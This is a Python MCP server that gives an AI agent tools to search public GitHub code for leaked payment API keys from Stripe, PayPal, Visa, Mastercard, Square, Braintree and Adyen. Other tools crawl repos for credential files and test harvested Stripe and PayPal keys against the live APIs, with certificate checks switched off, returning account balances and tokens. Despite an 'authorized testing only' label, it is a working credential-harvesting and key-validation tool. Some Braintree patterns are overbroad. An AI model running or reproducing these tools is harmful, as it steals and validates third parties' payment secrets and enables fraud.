#!/usr/bin/env python3
"""
Mass Payment API Key Scanner
Scans public GitHub repos for leaked payment API keys (Stripe, Visa, MC, PayPal, Amex).
FOR AUTHORIZED SECURITY TESTING ONLY - EDUCATIONAL PURPOSES ONLY
"""

import json
import os
import re
import subprocess
import time
from datetime import datetime
from pathlib import Path

from mcp.server.fastmcp import FastMCP

app = FastMCP("mass_payment_key_scanner")

# ─── Key Patterns ────────────────────────────────────────────────────────────

KEY_PATTERNS = {
    "stripe": {
        "live": r"sk_live_[a-zA-Z0-9]{24,}",
        "test": r"sk_test_[a-zA-Z0-9]{24,}",
        "restricted": r"rk_live_[a-zA-Z0-9]{24,}",
        "publishable": r"pk_live_[a-zA-Z0-9]{24,}",
        "webhook": r"whsec_[a-zA-Z0-9]{24,}",
    },
    "paypal": {
        "client_id": r"AY[a-zA-Z0-9]{20,}",
        "secret": r"E[a-zA-Z0-9]{20,}",
        "access_token": r"access_token\$production\$[a-z0-9]{16}\$[a-z0-9]{20,}",
    },
    "visa": {
        "api_key": r"(?:visa.*api[_\-]?key|api[_\-]?key.*visa).*?['\"]([A-Za-z0-9_\-]{20,})['\"]",
        "user_id": r"VISA_USER_ID['\"]?\s*[:=]\s*['\"]([A-Za-z0-9_\-]{4,})['\"]",
        "password": r"VISA_PASSWORD['\"]?\s*[:=]\s*['\"]([^'\"]{4,})['\"]",
    },
    "mastercard": {
        "api_key": r"(?:mastercard.*api[_\-]?key|api[_\-]?key.*mastercard).*?['\"]([A-Za-z0-9_\-]{20,})['\"]",
        "consumer_key": r"MASTERCARD_CONSUMER_KEY['\"]?\s*[:=]\s*['\"]([A-Za-z0-9_\-]{4,})['\"]",
    },
    "amex": {
        "api_key": r"(?:amex.*api[_\-]?key|api[_\-]?key.*amex).*?['\"]([A-Za-z0-9_\-]{20,})['\"]",
    },
    "square": {
        "access_token": r"sq0[a-z]{3}-[a-zA-Z0-9_-]{20,}",
        "application_id": r"sq0idp-[a-zA-Z0-9_-]{10,}",
    },
    "braintree": {
        "public_key": r"[a-z0-9]{16,}",
        "private_key": r"[a-f0-9]{32,}",
        "merchant_id": r"[a-z0-9]{16,}",
    },
    "adyen": {
        "api_key": r"AQ[a-zA-Z0-9]{20,}",
    },
}

# ─── Search Queries ──────────────────────────────────────────────────────────

GITHUB_QUERIES = [
    # Stripe
    "sk_live_",
    "sk_test_",
    "pk_live_",
    "whsec_",
    "stripe_secret",
    "stripe_api_key",
    "STRIPE_SECRET_KEY",
    "STRIPE_API_KEY",
    
    # PayPal
    "paypal_secret",
    "paypal_client_id",
    "PAYPAL_SECRET",
    "PAYPAL_CLIENT_ID",
    
    # Visa
    "VISA_USER_ID",
    "VISA_PASSWORD",
    "VISA_KEY_PATH",
    "VISA_CERT_PATH",
    "sandbox.api.visa.com",
    "visa_api_key",
    
    # Mastercard
    "MASTERCARD_API_KEY",
    "MASTERCARD_SECRET",
    "MASTERCARD_CONSUMER_KEY",
    "sandbox.mastercard.com",
    
    # Amex
    "amex_api_key",
    "AMEX_API_KEY",
    
    # Square
    "sq0idp-",
    "square_access_token",
    "SQUARE_ACCESS_TOKEN",
    
    # Braintree
    "braintree_private",
    "BRAINTREE_PRIVATE",
    
    # Adyen
    "adyen_api_key",
    "ADYEN_API_KEY",
    
    # Generic
    "payment_gateway_api",
    "payment_api_key",
    "payment_secret",
]


# ─── MCP Tools ──────────────────────────────────────────────────────────────

@app.tool()
def scan_github_for_payment_keys(max_results_per_query: int = 10, queries: list = None) -> str:
    """
    Scan GitHub for leaked payment API keys.
    Returns JSON with all findings.
    """
    if queries is None:
        queries = GITHUB_QUERIES
    
    all_findings = []
    
    for query in queries:
        print(f"[*] Scanning: {query}")
        
        try:
            proc = subprocess.run(
                ["gh", "search", "code", query, "--limit", str(max_results_per_query),
                 "--json", "repository,path,textMatches"],
                capture_output=True, text=True, timeout=30
            )
            
            if proc.returncode == 0 and proc.stdout.strip():
                data = json.loads(proc.stdout)
                for item in data:
                    repo = item.get("repository", {}).get("fullName", "?")
                    path = item.get("path", "?")
                    
                    for match in item.get("textMatches", []):
                        text = match.get("fragment", "")
                        
                        # Skip placeholders
                        if any(x in text.lower() for x in [
                            "your_", "example_", "placeholder", "xxxx", "test_key",
                            "fake_", "dummy_", "sample_", "demo_"
                        ]):
                            continue
                        
                        # Detect provider
                        provider = detect_provider(text)
                        
                        all_findings.append({
                            "query": query,
                            "provider": provider,
                            "repo": repo,
                            "path": path,
                            "match": text[:300],
                            "timestamp": datetime.now().isoformat(),
                        })
        
        except subprocess.TimeoutExpired:
            print(f"  [-] Timeout: {query}")
        except Exception as e:
            print(f"  [-] Error: {e}")
        
        time.sleep(0.5)  # Rate limit
    
    return json.dumps({
        "total_findings": len(all_findings),
        "queries_searched": len(queries),
        "findings": all_findings,
    }, indent=2)


@app.tool()
def scan_repo_for_keys(repo: str) -> str:
    """
    Deep scan a specific repo for payment API keys.
    Returns all keys found in the repo.
    """
    findings = []
    
    # Get all files in repo
    try:
        proc = subprocess.run(
            ["gh", "api", f"repos/{repo}/git/trees/main?recursive=1", "--jq", ".[].path"],
            capture_output=True, text=True, timeout=15
        )
        
        if proc.returncode != 0:
            # Try master branch
            proc = subprocess.run(
                ["gh", "api", f"repos/{repo}/git/trees/master?recursive=1", "--jq", ".[].path"],
                capture_output=True, text=True, timeout=15
            )
        
        if proc.returncode == 0:
            paths = proc.stdout.strip().split("\n")
            
            # Filter for likely credential files
            interesting = [
                p for p in paths if any(x in p.lower() for x in [
                    ".env", "config", "secret", "key", "credential", "payment",
                    "visa", "mastercard", "stripe", "paypal", "amex"
                ])
            ]
            
            for path in interesting[:50]:  # Limit to 50 files
                try:
                    content_proc = subprocess.run(
                        ["gh", "api", f"repos/{repo}/contents/{path}", "--jq", ".content"],
                        capture_output=True, text=True, timeout=10
                    )
                    
                    if content_proc.returncode == 0:
                        import base64
                        content = base64.b64decode(content_proc.stdout.strip()).decode()
                        
                        # Search for key patterns
                        for provider, patterns in KEY_PATTERNS.items():
                            for pattern_name, pattern in patterns.items():
                                matches = re.findall(pattern, content)
                                for match in matches:
                                    findings.append({
                                        "repo": repo,
                                        "path": path,
                                        "provider": provider,
                                        "key_type": pattern_name,
                                        "key_value": match[:50] + "..." if len(match) > 50 else match,
                                    })
                except:
                    continue
    
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)
    
    return json.dumps({
        "repo": repo,
        "files_scanned": len(interesting) if 'interesting' in dir() else 0,
        "keys_found": len(findings),
        "findings": findings,
    }, indent=2)


@app.tool()
def test_stripe_key(api_key: str) -> str:
    """
    Test a Stripe API key against the Stripe API.
    Returns key metadata if valid.
    """
    import urllib.request
    import ssl
    import base64
    
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    
    # Test with balance endpoint
    req = urllib.request.Request(
        "https://api.stripe.com/v1/balance",
        headers={
            "Authorization": f"Bearer {api_key}",
        }
    )
    
    try:
        resp = urllib.request.urlopen(req, context=ctx, timeout=10)
        data = json.loads(resp.read().decode())
        return json.dumps({
            "valid": True,
            "key_type": "live" if "livemode" in data and data["livemode"] else "test",
            "balance_available": data.get("available", []),
            "balance_pending": data.get("pending", []),
        }, indent=2)
    except urllib.error.HTTPError as e:
        body = e.read().decode()
        return json.dumps({
            "valid": False,
            "status": e.code,
            "error": json.loads(body) if body else "Unknown",
        }, indent=2)
    except Exception as e:
        return json.dumps({"valid": False, "error": str(e)}, indent=2)


@app.tool()
def test_paypal_token(client_id: str, secret: str) -> str:
    """
    Test PayPal API credentials.
    Returns token info if valid.
    """
    import urllib.request
    import ssl
    import base64
    
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    
    # Get OAuth token
    auth = base64.b64encode(f"{client_id}:{secret}".encode()).decode()
    req = urllib.request.Request(
        "https://api.paypal.com/v1/oauth2/token",
        data=b"grant_type=client_credentials",
        headers={
            "Authorization": f"Basic {auth}",
            "Content-Type": "application/x-www-form-urlencoded",
        }
    )
    
    try:
        resp = urllib.request.urlopen(req, context=ctx, timeout=10)
        data = json.loads(resp.read().decode())
        return json.dumps({
            "valid": True,
            "token_type": data.get("token_type"),
            "expires_in": data.get("expires_in"),
            "app_id": data.get("app_id"),
        }, indent=2)
    except urllib.error.HTTPError as e:
        return json.dumps({
            "valid": False,
            "status": e.code,
            "error": e.read().decode()[:200],
        }, indent=2)
    except Exception as e:
        return json.dumps({"valid": False, "error": str(e)}, indent=2)


@app.tool()
def get_key_patterns() -> str:
    """Return all key patterns used for scanning."""
    return json.dumps(KEY_PATTERNS, indent=2)


@app.tool()
def get_search_queries() -> str:
    """Return all GitHub search queries."""
    return json.dumps(GITHUB_QUERIES, indent=2)


# ─── Helper Functions ────────────────────────────────────────────────────────

def detect_provider(text: str) -> str:
    """Detect payment provider from text."""
    text_lower = text.lower()
    if "stripe" in text_lower or "sk_live" in text_lower or "sk_test" in text_lower:
        return "stripe"
    if "paypal" in text_lower:
        return "paypal"
    if "visa" in text_lower:
        return "visa"
    if "mastercard" in text_lower:
        return "mastercard"
    if "amex" in text_lower or "american express" in text_lower:
        return "amex"
    if "square" in text_lower:
        return "square"
    if "braintree" in text_lower:
        return "braintree"
    if "adyen" in text_lower:
        return "adyen"
    return "unknown"


if __name__ == "__main__":
    app.run()
